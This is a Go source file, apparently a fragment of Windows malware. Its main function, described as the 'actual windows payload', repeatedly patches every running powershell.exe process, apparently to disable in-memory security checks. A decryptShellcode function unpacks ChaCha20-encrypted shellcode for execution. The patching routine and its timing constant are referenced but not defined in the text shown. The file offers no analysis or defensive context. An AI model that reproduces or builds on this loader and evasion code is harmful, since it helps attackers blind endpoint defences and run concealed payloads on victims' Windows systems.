//go:build windows

package main

import (
	"time"

	"golang.org/x/crypto/chacha20poly1305"
)

// Main function for handling the actual windows payload
func main() {
	for {
		PatchAllPowershells("powershell.exe")
		time.Sleep(ptchdrq * time.Millisecond)
	}
}

func decryptShellcode(buf []byte, key []byte) (plaintext []byte, err error) {
	aead, err := chacha20poly1305.NewX(key)
	if err != nil {
		return nil, err
	}

	if len(buf) < aead.NonceSize() {
		panic("ciphertext too short")
	}

	// Split nonce and ciphertext.
	nonce, ciphertext := buf[:aead.NonceSize()], buf[aead.NonceSize():]

	// Decrypt the message and check it wasn't tampered with.
	plaintext, err = aead.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		return nil, err
	}

	return plaintext, nil
}
